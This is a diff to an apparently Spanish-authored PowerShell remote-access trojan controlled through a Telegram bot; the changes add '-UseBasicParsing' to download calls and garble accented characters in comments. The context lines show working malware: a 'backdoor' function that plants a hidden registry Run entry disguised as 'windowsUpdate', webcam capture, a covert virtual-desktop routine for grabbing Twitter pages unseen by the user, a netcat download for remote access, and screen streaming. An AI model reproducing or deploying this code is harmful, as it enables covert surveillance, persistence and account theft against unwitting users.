@@ -74,7 +74,7 @@ function backdoor {
         reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /f
         
         Send-Message "Downloading.."
-        Invoke-WebRequest -Uri $githubScript -OutFile C:\Users\$env:username\Documents\windowsUpdate.ps1
+        Invoke-WebRequest -UseBasicParsing -Uri $githubScript -OutFile C:\Users\$env:username\Documents\windowsUpdate.ps1
 
         Send-Message "Adding_to_the_reg.."
 		reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"
@@ -267,7 +267,7 @@ function webcam {
     $url = "https://github.com/tedburke/CommandCam/raw/master/CommandCam.exe"
     $outpath = "C:\Users\$env:username\Documents\CommandCam.exe"
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    Invoke-WebRequest -Uri $url -OutFile $outpath
+    Invoke-WebRequest -UseBasicParsing -Uri $url -OutFile $outpath
 
     Send-Message "Taking_picture.."
     $args = "/filename C:\Users\$env:username\Documents\image.jpg"
@@ -318,8 +318,8 @@ function mainBrowser {
 
 function HackTwitterW10 {
     <#
-    Creará un nuevo dekstop virtual e iniciará ahí el firefox y guardará el html, como es un desktop virtual el usuario no se enterará de lo que pasa
-    Esta funcion solo es válida para W10.
+    CrearÃ¡ un nuevo dekstop virtual e iniciarÃ¡ ahÃ­ el firefox y guardarÃ¡ el html, como es un desktop virtual el usuario no se enterarÃ¡ de lo que pasa
+    Esta funcion solo es vÃ¡lida para W10.
     Manuales: 
         https://docs.microsoft.com/en-us/windows/desktop/inputdev/virtual-key-codes 
     #>
@@ -391,10 +391,10 @@ public static void SwitchRightVirtualDesktopInWin10()
     $wshell = New-Object -ComObject wscript.shell
     $KeyShortcut2::SwitchLeftVirtualDesktopInWin10()
 
-    # Espera 10 segundos a cargar completamente la página
+    # Espera 10 segundos a cargar completamente la pÃ¡gina
     Start-sleep -Seconds 10
 
-    # Activa la ventana con el nombre: 'Iniciar sesión en Twitter'
+    # Activa la ventana con el nombre: 'Iniciar sesiÃ³n en Twitter'
     $KeyShortcut3::SwitchRightVirtualDesktopInWin10()
     $wshell.AppActivate('twitter') 
     $wshell.SendKeys("^{s}") 
@@ -492,10 +492,10 @@ public static void SwitchRightVirtualDesktopInWin10()
     $wshell = New-Object -ComObject wscript.shell
     $KeyShortcut2::SwitchLeftVirtualDesktopInWin10()
 
-    # Espera 10 segundos a cargar completamente la página
+    # Espera 10 segundos a cargar completamente la pÃ¡gina
     Start-sleep -Seconds 10
 
-    # Activa la ventana con el nombre: 'Iniciar sesión en Twitter'
+    # Activa la ventana con el nombre: 'Iniciar sesiÃ³n en Twitter'
     $KeyShortcut3::SwitchRightVirtualDesktopInWin10()
     $wshell.AppActivate('Mozilla Firefox') 
     $wshell.SendKeys("^{s}") 
@@ -525,7 +525,7 @@ function netcat($ip) {
     $outpath = "C:\Users\$env:username\Documents\nc.zip"
     $outpathUnzip  = "C:\Users\$env:username\Documents\nc"
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    Invoke-WebRequest -Uri $url -OutFile $outpath
+    Invoke-WebRequest -UseBasicParsing -Uri $url -OutFile $outpath
     
     Start-Sleep -Seconds 5
     Expand-Archive $outpath -DestinationPath $outpathUnzip
@@ -555,7 +555,7 @@ function twitch($STREAM_KEY) {
     $outpath = "C:\Users\$env:username\Documents\FFmpeg.zip"
     $outpathUnzip  = "C:\Users\$env:username\Documents\FFmpeg"
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    Invoke-WebRequest -Uri $url -OutFile $outpath
+    Invoke-WebRequest -UseBasicParsing -Uri $url -OutFile $outpath
 
     Send-Message "Starting_streaming.."
     Start-Sleep -Seconds 5
@@ -601,7 +601,7 @@ $payload = @{
     "parse_mode" = $markdown_mode;
     "disable_web_page_preview" = $preview_mode;
 }
-Invoke-WebRequest `
+Invoke-WebRequest -UseBasicParsing `
     -Uri ("https://api.telegram.org/bot{0}/sendMessage" -f $BotToken) `
     -Method Post `
     -ContentType "application/json;charset=utf-8" `
@@ -617,7 +617,7 @@ $LoopSleep = 3
  
  
 #Get the Last Message Time at the beginning of the script:When the script is ran the first time, it will ignore any last message received!
-$BotUpdates = Invoke-WebRequest -Uri "https://api.telegram.org/bot$($BotToken)/getUpdates"
+$BotUpdates = Invoke-WebRequest -UseBasicParsing -Uri "https://api.telegram.org/bot$($BotToken)/getUpdates"
 $BotUpdatesResults = [array]($BotUpdates | ConvertFrom-Json).result
 $LastMessageTime_Origin = $BotUpdatesResults[$BotUpdatesResults.Count-1].message.date
  
@@ -637,7 +637,7 @@ While ($DoNotExit)  {
   $Message = ""
   
   #Get the current Bot Updates and store them in an array format to make it easier
-  $BotUpdates = Invoke-WebRequest -Uri "https://api.telegram.org/bot$($BotToken)/getUpdates"
+  $BotUpdates = Invoke-WebRequest -UseBasicParsing -Uri "https://api.telegram.org/bot$($BotToken)/getUpdates"
   $BotUpdatesResults = [array]($BotUpdates | ConvertFrom-Json).result
   
   #Get just the last message:
@@ -688,7 +688,7 @@ While ($DoNotExit)  {
 		$DoNotExit = 0
 	  }
       "/list"  {
-        Invoke-WebRequest `
+        Invoke-WebRequest -UseBasicParsing `
         -Uri ("https://api.telegram.org/bot{0}/sendMessage" -f $BotToken) `
         -Method Post `
         -ContentType "application/json;charset=utf-8" `
